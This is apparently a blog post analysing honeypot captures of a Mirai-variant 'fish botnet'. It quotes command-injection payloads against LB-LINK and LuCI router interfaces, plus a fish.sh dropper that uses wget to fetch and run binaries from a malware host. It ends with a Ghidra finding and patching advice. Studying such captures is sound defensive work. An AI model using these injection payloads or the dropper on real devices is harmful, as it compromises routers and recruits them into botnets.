---
layout: post
title:  "Fish Botnet"
date:   2024-01-21 10:25:33 +0100
category: malware
tags: malware reverse-engineering honey-pot ghidra
--- 

The honey pot has caught a fish, so I guess its more of a fishing net? 

It has logged two entries from a "fish botnet" 

The first attack appears to be attempting to exploit a [vulnerability in LB-LINK routers.](https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet) It does this by performing a `POST` to `/goform/set_LimitClient_cfg` and injects commands into the `mac` field.

The command causes the device to download and execute the malware.

```
07:51:59.583 Handling POST to /goform/set_LimitClient_cfg request from 96.127.160.234
>>>Headers: HoneyPotIp:8080 t.me/DeltaApi 150 user=admin gzip 
>>>Body: time1=00:00-00:00&time2=00:00-00:00&mac=; cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://193.111.248.58/mipsel; chmod 777 mipsel; ./mipsel
07:51:59.584 completed response status 200
```


The second entry performs a similar attack but looks like its attempting to exploit vulnerabilities in [LuCI web interface](https://openwrt.org/docs/guide-user/luci/start)

```
09:10:53.617 Handling POST to /cgi-bin/luci/;stok=/locale?form=country request from 194.48.250.103
>>>Headers: identity application/x-www-form-urlencoded 152 HoneyPotIp:8080 Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0 close 
>>>Body: operation=write&country=$(id>`cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; 193.111.248.58/fish.sh; chmod 777 fish.sh; sh fish.sh; history -c`)
09:10:53.619 completed response status 200
```
This attack is slightly different to the first, but is more common to what we have seen in the past. This attack downloads and runs a `sh` (named fish.sh) file rather than downloading the malware binary directly. The `sh` file is used to download and run the malware compiled for different architectures

*fish.sh:*
```
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/mipsel; chmod 777 mipsel; ./mipsel
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/mips; chmod 777 mips; ./mips
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/arm; chmod 777 arm; ./arm
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/arm5; chmod 777 arm5; ./arm5
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/arm6; chmod 777 arm6; ./arm6
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/arm7; chmod 777 arm7; ./arm7
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/x86_64; chmod 777 x86_64; ./x86_64
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/i686; chmod 777 i686; ./i686
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/1586; chmod 777 1586; ./1586
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/sh4; chmod 777 sh4; ./sh4
cd /tmp; cd /run; cd /root; cd /; wget http://193.111.248.58/arc; chmod 777 arc; ./arc

```


This appears to be yet another [Mirai](https://en.wikipedia.org/wiki/Mirai_(malware)) variant, possibly based on Moobot or Satori.
By using [Ghidra](https://ghidra-sre.org/) we can see it contains the string `w5q6he3dbrsgmclkiu4to18npavj702f` 

[![Strings](/assets/img/fish-botnet/strings.png)](/assets/img/fish-botnet/strings.png)

This string also appears to be found in [Moobot variants](https://threatpost.com/moobot-botnet-hikvision-surveillance-systems/176879/) 


Most of the web-servers that are used to host malware either don't contain HTML pages or are just left with the default pages for Apache HTTP or nginx etc 

Interestingly this server does contain an index page which displays a picture of a fish 

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fish Botnet</title> <!-- Title of the webpage -->
    <style type="text/css">
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #121212; /* Dark background */
            color: #ffffff; /* Light text color for contrast */
            font-family: monospace;
        }
        .centered {
            text-align: center;
        }
        img {
            width: 1000px;
            height: 1000px;
        }
    </style>
</head>
<body>
    <div class="centered">
        <text>Available</text>
        <h1><a href="/"><img src="fishy.png" alt="fish" width="1000" height="1000"></a></h1>
    </div>
</body>
</html>
```

Say hello to fishy the fish

[![Fishy the fish](/assets/img/fish-botnet/fish-botnet-index.png)](/assets/img/fish-botnet/fish-botnet-index.png)

Fishy should be a reminder to us all to keep firmware updated, change default passwords and restrict access to devices that don't need to be exposed to the internet.
